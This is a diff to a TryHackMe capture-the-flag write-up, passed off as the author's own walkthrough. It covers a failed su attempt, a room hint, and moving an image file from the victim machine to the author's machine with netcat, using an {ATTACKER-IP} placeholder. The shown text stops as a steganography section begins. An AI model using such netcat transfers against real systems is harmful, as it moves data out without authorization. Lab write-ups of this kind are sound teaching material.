@@ -187,3 +187,32 @@ Since these efforts did not work, I decided to take stock of what user **www-dat
 
 You should see a suspicious file called **passphrase.txt**. Enter `cat passphrase.txt` to view its contents, and you will see a Base-64 encoded password. Due to the rules of TryHackMe writeups, I cannot include the encrypted password or the plaintext password here. However, pasting the encrypted password into **CyberChef**'s input field and using magic should give you the plaintext passphrase. I'd suggest writing this passphrase down somewhere; for the rest of the writeup, I will call it **PASSWORD1**.
 
+## Hitting a roadblock and using a hint
+This section of the writeup covers a failed attempt at switching to a different user. Feel free to skip this section; however, I wanted to include it because it is an important part of how I found the solution.
+
+Anyways, here's the roadblock I struggled with for an hour: I falsely assumed that **PASSWORD1** would give me direct access to another user with greater privileges than **www-data**. I first tried to determine the other usernames by entering `ls -la /home`, which is a common technique in CTFs. After noticing a user named **deku**, I attempted to switch users by entering `su deku` and then entering PASSWORD1. However, I was unsuccessful.
+
+At this point, I viewed the hint that the creator of the room gave us: **Once you found a way in, be suspicious of any unused files.** This led me to remember the directory we failed to access earlier: the **/assets/images** directory on the website.
+
+## Transferring an image to our local machine
+Based on this logic, I entered `cd /var/www/html/assets/images` to enter the **images** directory. Then, I used `ls -la` to view its contents, and here are the results:
+
+```
+$ ls -la
+total 336
+drwxrwxr-x 2 www-data www-data   4096 Jul  9  2023 .
+drwxrwxr-x 3 www-data www-data   4096 Aug 24 18:57 ..
+-rw-rw-r-- 1 www-data www-data  98264 Jul  9  2023 oneforall.jpg
+-rw-rw-r-- 1 www-data www-data 237170 Jul  9  2023 yuei.jpg
+```
+
+I recalled that only one image was used in the victim's website, meaning one of these files must be the "unused file" referenced by the hint! I used the following to transfer it to my local machine:
+
+`nc -l -p 4444 > oneforall.jpg' (on my attacker machine)
+
+'nc -w 3 {ATTACKER-IP} 4444 < oneforall.jpg' (on the victim machine; remember to replace ATTACKER-IP with your individual attacker IP.
+
+**Note**: Like the PHP script earlier, you don't have to understand the workings of these commands. Even I had to use Nakkaya.com as a reference (https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/). Long story short, remember that **these commands are moving the image to our machine** for further analysis.
+
+## Steganography (finding hidden data in an image)
+On my attacker machine, in the directory containing **oneforall.jpg**,
